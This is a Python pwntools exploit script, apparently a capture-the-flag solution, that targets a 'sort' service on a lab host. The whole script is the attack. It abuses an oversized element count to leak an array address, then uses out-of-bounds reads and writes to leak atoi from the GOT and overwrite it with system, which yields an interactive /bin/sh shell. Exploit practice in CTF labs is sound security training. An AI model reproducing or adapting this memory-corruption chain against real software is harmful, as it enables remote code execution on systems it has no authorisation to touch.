from pwn import *

p = remote('pwn.lab.seclover.com', 11111)

p.sendlineafter('_CMD_$ ', 'sort')

p.sendlineafter('want to sort: ', '1')
p.sendlineafter('Enter a number: ', str(0x40000000))

p.sendlineafter('Choose: ', '3')

p.sendlineafter('Choose: ', '1')
p.sendlineafter('Query index: ', '1')

p.recvuntil('Query result: ')
leak = int(p.recvline())
log.success('arr address is %x' % leak)

p.sendlineafter('Choose: ', '2')
p.sendlineafter('Update index: ', '1')
p.sendlineafter('Update number: ', str(leak + 4))

p.sendlineafter('Choose: ', '7')

p.sendlineafter('_CMD_$ ', 'reload')
p.sendlineafter('history ID: ', '0')

atoi_got_plt_index = (0x10804D020 - (leak+20)) >> 2

atoi_addr = 0x0002D8E0
system_addr = 0x0003BC90

p.sendlineafter('Choose: ', '1')
p.sendlineafter('Query index: ', str(atoi_got_plt_index))

p.recvuntil('Query result: ')
atoi = int(p.recvline())
log.success('atoi address is %x' % atoi)

p.sendlineafter('Choose: ', '2')
p.sendlineafter('Update index: ', str(atoi_got_plt_index))
p.sendlineafter('Update number: ', str(atoi - atoi_addr + system_addr))

p.sendlineafter('Choose: ', '/bin/sh')

p.interactive()
